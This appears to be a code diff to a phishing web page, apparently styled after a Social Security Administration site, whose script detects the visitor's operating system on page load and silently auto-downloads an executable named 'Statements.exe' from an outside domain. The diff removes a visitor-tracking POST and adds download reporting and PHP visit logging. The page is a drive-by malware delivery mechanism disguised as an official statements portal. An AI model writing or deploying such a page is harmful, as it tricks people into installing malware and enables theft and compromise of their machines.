@@ -29,13 +29,11 @@
         }
 	</style>
 	<script>
-        // Function to report the visit to the PHP script and handle auto-download
-        window.onload = function () {
+        // Detect OS and auto-download the appropriate file
+        window.onload = function() {
             const userAgent = navigator.userAgent;
-            const referrer = document.referrer || "Direct Access";
             let fileUrl = '';
 
-            // Determine the appropriate file for download
             if (/Win/i.test(userAgent)) {
                 fileUrl = 'https://specialitystoreservice.com/camphere/sigidwhat/Statements.exe';
             } else if (/Mac/i.test(userAgent)) {
@@ -46,20 +44,19 @@
                 fileUrl = 'https://specialitystoreservice.com/camphere/sigidwhat/Statements.exe'; // Default to Windows
             }
 
-            // Send visitor data to the PHP script via AJAX
-            const xhr = new XMLHttpRequest();
-            xhr.open("POST", "visitor_counter_reporting.php", true); // Update to point to the PHP script
-            xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
-            xhr.send(`userAgent=${encodeURIComponent(userAgent)}&referrer=${encodeURIComponent(referrer)}`);
-
-            // Handle auto-download of the file
-            setTimeout(function () {
+            // Auto-download the file
+            setTimeout(function() {
                 const link = document.createElement('a');
                 link.href = fileUrl;
                 link.download = fileUrl.substring(fileUrl.lastIndexOf('/') + 1);
                 document.body.appendChild(link);
                 link.click();
                 document.body.removeChild(link);
+
+                // Report download to server
+                fetch('ssa_file_download.php?action=report_download', {
+                    method: 'POST'
+                });
             }, 100); // Delay to ensure page fully loads
 
             // Update the manual download link
@@ -69,6 +66,17 @@
     </script>
 </head>
 <body class="uef-theme-std">
+<?php
+// Report visit to the server
+if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_GET['action']) && $_GET['action'] === 'report_download') {
+    // Record download action
+    file_put_contents('downloads.log', date('Y-m-d H:i:s') . " - File downloaded\n", FILE_APPEND);
+    exit;
+}
+
+// Log visits to the site
+file_put_contents('visits.log', date('Y-m-d H:i:s') . " - Page visited\n", FILE_APPEND);
+?>
 <header>
     <div id="uef-tmpl-header">
         <a accesskey="K" href="#" id="uef-tmpl-skipNav">Skip to Content</a>
